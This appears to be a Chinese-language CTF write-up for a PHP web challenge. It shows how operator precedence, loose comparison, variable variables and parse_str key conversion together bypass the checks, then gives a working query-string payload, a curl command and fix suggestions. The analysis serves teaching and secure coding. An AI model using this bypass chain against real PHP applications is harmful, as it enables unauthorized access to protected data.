# 2026 HUSEC — ctf26（PHP 变量覆盖）

## 题目信息

| 项目 | 内容 |
|---|---|
| 赛事 | 2026 HUSEC |
| 题目 | ctf26 |
| 类型 | Web |
| 考点 | 运算符优先级、松散比较、变量变量、`parse_str` 数组键转换 |
| 环境 | PHP/7.4.30 |
| Flag | `flag{c0ngR4TuLA7ion5_2026_HUSEC}` |

## 1. 源码还原

访问题目地址后由 `show_source(__FILE__)` 直接泄漏源码：

```php
<?php
show_source(__FILE__);
include('flag.php');
$a = $_GET['a'];
$b = $_GET['b'];
$c = $_GET['c'];

$shiki = is_numeric($a) and preg_match('/^[a-z0-9]+$/i', $b);   // ①
if ($shiki == 1) {                                              // ②
    if (intval($b) == 'summer') {                               // ③
        if (strpos($b, "0") == 0) {                             // ④
            die('B cannot start with 0!');
        } else {
            $$c = $a;                                           // ⑤
            parse_str($b, $pockets);                            // ⑥
            if ($pockets[$summer] == md5($c)) {                 // ⑦
                echo $flag;                                     // ⑧
            }
        }
    } else { die('Invalid b!'); }
} else { die('Invalid shiki!'); }
```

## 2. 逐点审计

### ① 运算符优先级陷阱（最关键的入口）

```php
$shiki = is_numeric($a) and preg_match('/^[a-z0-9]+$/i', $b);
```

PHP 中 `=` 的优先级**高于** `and`，所以实际等价于：

```php
($shiki = is_numeric($a)) and preg_match(...);
```

`preg_match` 的返回值被直接丢弃 —— **正则校验形同虚设**，`$b` 完全不受"只能字母数字"的限制。
（要正确生效必须写成 `$shiki = is_numeric($a) && preg_match(...)`，`&&` 优先级高于 `=`。）

### ② `$shiki == 1`

由于 ①，这里只等价于 `is_numeric($a)` 为真。

### ③ 松散比较

```php
intval($b) == 'summer'
```

int 与非数字字符串比较，PHP 7 会把字符串转成数字 → `'summer'` 变成 `0`。
所以只需 **`intval($b) === 0`** 即可。

> PHP 8 已修复此行为（数字转字符串比较），该题必须运行在 PHP < 8。
> 实测响应头 `X-Powered-By: PHP/7.4.30` 印证。

### ④ `strpos` 的双重陷阱

```php
strpos($b, "0") == 0
```

- `"0"` 在首位 → 返回 `0` → 条件为真 → `die`
- `"0"` **完全不存在** → 返回 `false`，而 `false == 0` 为真 → **也会 `die`**
- 所以 `"0"` 必须**存在且不在首位**

### ⑤ 变量变量覆盖

```php
$$c = $a;
```

`$c` 完全可控 → 可以直接**定义出 ⑦ 里那个未声明的 `$summer`**。这是本题的钥匙。

### ⑥ `parse_str` 的键转换

```php
parse_str($b, $pockets);
```

把 `$b` 当 query string 解析成数组。注意 PHP 会把**"整数字面量"形式的字符串键强制转成 int**：
`$pockets['-0']` 与 `$pockets[0]` **完全等价**。

### ⑦ 最终判定

```php
$pockets[$summer] == md5($c)
```

需要键等于 `$summer`、值等于 `md5($c)`。

## 3. 利用链构造

### 第 1 步：让 `$summer` 存在

用 ⑤ 的变量变量把 `$summer` 造出来：

```
c=summer   →   $$c = $a   →   $summer = $a
```

### 第 2 步：选 `$a`，同时满足"是数字"和"能当数组键"

`$a` 要过 ② 的 `is_numeric`，又要在 ⑦ 里当数组键。取 `a=-0`：

- `is_numeric('-0')` → `true` ✓
- 数组键转换：`'-0'` → `int 0`，即 `$pockets['-0']` ≡ `$pockets[0]` ✓

### 第 3 步：选 `$b`，同时满足 ③④ 并解析出键 `0`

取 `b=-0=<md5>`：

- `intval("-0=6b16…")` → `0`，满足 `0 == 'summer'` ✓（③）
- `strpos("-0=6b16…", "0")` → `1`（`-` 在 0 位，`0` 在 1 位）→ `1 == 0` 为假 → 走 else ✓（④）
- `parse_str("-0=6b16…", $pockets)` → `$pockets[0] = "6b16…"` ✓

### 第 4 步：算出 `md5($c)`

```
$c = 'summer'
md5('summer') = 6b1628b016dff46e6fa35684be6acc96
```

## 4. Payload

```
?a=-0&b=-0=6b1628b016dff46e6fa35684be6acc96&c=summer
```

复现命令：

```bash
curl -s "http://TARGET/ctf26/?a=-0&b=-0=6b1628b016dff46e6fa35684be6acc96&c=summer"
```

服务端执行流程：

```
$shiki = is_numeric("-0")                        → true  ✓
intval("-0=6b16…") == 'summer'                   → 0 == 0  ✓
strpos("-0=6b16…", "0") == 0                     → 1 == 0 假 → else 分支 ✓
$$c = $a          →  $summer = "-0"
parse_str("-0=6b16…", $pockets)                  → $pockets[0] = "6b16…"
$pockets[$summer] == md5($c)
  → $pockets["-0" → int 0] == md5("summer")
  → "6b1628b016dff46e6fa35684be6acc96" == "6b1628b016dff46e6fa35684be6acc96"  ✓
echo $flag
```

**Flag**：`flag{c0ngR4TuLA7ion5_2026_HUSEC}`

## 5. 走过的死路（记录一下，避免下次重复）

第一反应是用**空键**：`$summer` 未定义 → `null` → 数组键变成 `""`，于是构造：

```
?a=1&b==0cc175b9c0f1b6a831c399e269772661&c=a
```

结果三个 `die` 都没触发（说明 ①②③④ 全过了），但最终 `if` 判假、无回显。

**原因**：`parse_str` 不会把 `=value` 解析成空字符串键，`$pockets['']` 根本不存在。
**必须走 `$c='summer'` 显式定义 `$summer` 这条路。**

## 6. 修复建议

```php
// ① 加括号，让正则真正生效
$shiki = is_numeric($a) && preg_match('/^[a-z0-9]+$/i', $b);

// ③ 严格比较，禁止类型 juggling
if (intval($b) === 0 && ctype_digit($b)) { ... }

// ④ 用 !== false 明确判断
if (strpos($b, "0") === 0) { ... }

// ⑤ 禁止变量变量，改白名单映射
$vars = ['summer' => &$summer];
$vars[$c] = $a;

// ⑥⑦ 解析前白名单校验，键使用前先判断存在
if (!isset($pockets[$summer])) { die('nope'); }
if (!hash_equals(md5($c), (string)$pockets[$summer])) { die('nope'); }
```

## 参考

- [PHP 运算符优先级](https://www.php.net/manual/zh/language.operators.precedence.php)
- [PHP 类型比较表（PHP 7 vs 8 差异）](https://www.php.net/manual/zh/types.comparisons.php)
- [parse_str 手册](https://www.php.net/manual/zh/function.parse-str.php)
